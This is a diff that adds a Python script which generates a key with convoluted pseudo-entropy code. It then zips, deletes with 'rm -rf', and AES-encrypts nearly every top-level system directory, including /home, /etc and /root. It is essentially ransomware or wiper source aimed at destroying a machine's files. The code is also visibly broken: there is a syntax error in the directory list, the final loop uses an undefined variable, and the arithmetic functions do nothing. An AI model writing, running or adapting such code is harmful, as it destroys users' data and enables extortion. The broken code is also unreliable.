@@ -1,0 +1,115 @@
+#!/usr/bin/env python3
+import os,sys,time,hashlib,random,base64,time,pyAesCrypt,string
+dire=['/home','/Users','/private','/System','/boot','/cdrom','/dev','/etc','/bin','/lib','/lost+found','/media','/mnt','/opt','/proc','/root','/run'.'/sbin','/srv','/sys','/usr','/var']
+#direct=['test','test2']
+def ben(num):
+	r=random.randint(1,1834091)
+	r=235+8*r/23+124*56*r/323+124*55*r/23/23+124*55*r/23*r/23/23+124*55*r/23/23+124*55*r/23*r/23/23+124*55*r/23/23+124*55*r/23*r/23/23+124*553/23*num
+	r=r*3/2+346*325*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23*r/23/23+124*55*r/23/23+124*55*r/23/23
+	r=235+8*r/23+124*2346*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23*r/23/23+124*55*r/23/23+124*5/23
+	r=r*3/2+346*325*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23*r/23/23+124*55*r/23/23+124*55*r/23/23
+	r=235+8*r/23+124*532*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23+124*55*r/23*r/23/23+124*55*r/23/23+124*55/23
+def ben10(num):
+	ben(num)
+	num+=3*2+num*43
+	ben(num)
+	num+=3*num*2323
+	ben(num)
+	num+=3*3+num*42
+	ben(num)
+	num+=3*num*4*23
+	ben(num)
+	num+=24*234/234
+	ben(num)
+	num+=3*4*423454
+	ben(num)
+	num+=3*22*3*4*4
+	ben(num)
+	num+=3*2*3*3*37
+	ben(num)
+	num+=7*57*num*3
+	ben(num)
+def key():
+    os.system('clear')
+    print('\n<loading source of entropy...>\n\n\n')
+    s=time.time()
+    r=random.randint(1,9999999999)
+    r2=random.randint(1,235622454)
+    r3=random.randint(41,52287653)
+    n1=0
+    while True:
+        if n1>99:
+            break
+        ben10(r+r2*17/r3*16)
+        n1+=0.5
+    e=time.time()
+    tim=round((e-s)*1000000000000000000)
+    random.seed(random.randint(1,999999999999))
+    r=random.random()+(time.time()-e)*10000000000000
+    while True:
+        if n1>999:
+            break
+        ben10(r+r2*17)
+        n1+=1
+    r2=random.random()+(time.time()-e)*10000000000000
+    while True:
+        if n1>9999:
+            break
+        ben10(r+r2/r3)
+        n1+=1
+    r3=random.random()+(time.time()-e)*10000000000000
+    r=r+r2+r3/10000000000000000+time.time()/100000-random.randint(1,999999)
+    char1=random.choice(string.ascii_letters)
+    char2=random.choice(string.ascii_letters)
+    char3=random.choice(string.ascii_letters)
+    char4=random.choice(string.ascii_letters)
+    char5=random.choice(string.ascii_letters)
+    char6=random.choice(string.ascii_letters)
+    char7=random.choice(string.ascii_letters)
+    char8=random.choice(string.ascii_letters)
+    r=round(r/100000)
+    new=random.randint(1,9)
+    if new==1:
+        r=f'{r}{char1}{r}{char3}{char8}{char5}{r}{char7}{r}{char2}{char4}{char6}{char5}{char5}{r}{r}{char1}{r}'
+    elif new==2:
+        r=f'{r}{char1}{char5}{char3}{char8}{char5}{char6}{char7}{r}{char2}{r}{char6}{char8}{char5}{char4}{r}{char3}{r}'
+    elif new==3:
+        r=f'{char7}{char1}{char8}{r}{char8}{char6}{r}{char7}{r}{char2}{char4}{char6}{r}{char5}{r}{char2}{char1}{char3}'
+    elif new==4:
+        r=f'{char2}{char1}{char6}{char3}{char8}{char5}{char6}{char7}{r}{char2}{char3}{r}{r}{char5}{r}{char5}{char1}{char8}'
+    elif new==5:
+        r=f'{char2}{char1}{char6}{r}{char8}{char5}{char6}{r}{char3}{char6}{char4}{r}{char8}{char5}{r}{char5}{char1}{char8}'
+    elif new==6:
+        r=f'{char2}{char1}{char6}{char3}{char8}{char5}{char6}{char7}{r}{char2}{char4}{r}{char3}{char5}{r}{char5}{char1}{r2}'
+    elif new==7:
+        r=f'{char2}{char1}{char6}{char3}{char8}{char5}{char6}{char7}{r}{char2}{char4}{new}{char5}{char5}{r}{char5}{r}{char2}'
+    elif new==8:
+        r=f'{char7}{char2}{char4}{char8}{char2}{r}{char6}{char7}{char4}{char3}{char4}{r}{char2}{r}{char3}{char5}{char1}{char8}'
+    elif new==9:
+        r=f'{r}{char4}{char6}{char6}{char8}{char8}{char6}{char2}{r}{r}{char4}{r}{char8}{char5}{r}{char5}{char1}{char8}'
+    print(f'{r}\n\n\n')
+    k=hashlib.md5(r.encode())
+    k=k.hexdigest()
+    k=base64.urlsafe_b64encode(bytes(str(k),'utf-8'))
+    k=str(k).replace("='",'')
+    k=str(k).replace("b'",'')
+    print('<key generated>\n\n\n')
+    return(k)
+def encdir(dire,key):
+	print(f'encrypting {dire}...')
+	os.system('zip enc -r %s'%dire)
+	os.system('rm -rf %s'%dire)
+	pyAesCrypt.encryptFile('enc.zip',f'{dire}.aes',str(key),512*512*512)
+	os.system('rm -rf enc.zip')
+	os.system(f'mv {dire}.aes {dire}')
+loop=0
+ch=int(input('number of keys to generate>'))
+while loop<ch:
+	k=key()
+	loop+=1
+num=-1
+while True:
+	if num>22:
+		sys.exit()
+	num+=1
+	encdir(direct[num],k)
